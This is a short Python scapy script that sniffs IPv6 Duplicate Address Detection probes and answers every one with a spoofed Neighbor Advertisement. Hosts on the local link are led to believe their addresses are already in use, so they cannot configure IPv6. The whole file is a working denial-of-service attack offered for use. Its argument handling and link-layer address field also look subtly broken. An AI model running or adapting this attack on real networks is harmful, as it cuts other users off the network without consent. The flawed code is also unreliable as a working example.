import argparse
import scapy.all as sp
import scapy.layers.inet6 as inet6

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', default=sp.conf.iface.name)
args = parser.parse_args()
iface = args.iface

if iface:
    sp.conf.iface = iface


def prn(pkt):
    tgt = pkt[sp.ICMPv6ND_NS].tgt
    print(f'Spoofing DAD to {tgt}')

    p = sp.Ether() / \
        inet6.IPv6(src=tgt, dst='ff02::1') / \
        inet6.ICMPv6ND_NA(tgt=tgt) / \
        inet6.ICMPv6NDOptDstLLAddr(lladdr=sp.conf.iface)
    sp.sendp(p, verbose=0)


filterstr = 'icmp6[icmp6type]==icmp6-neighborsolicit and ip6 src ::'

sp.sniff(filter=filterstr, prn=prn, quiet=True)
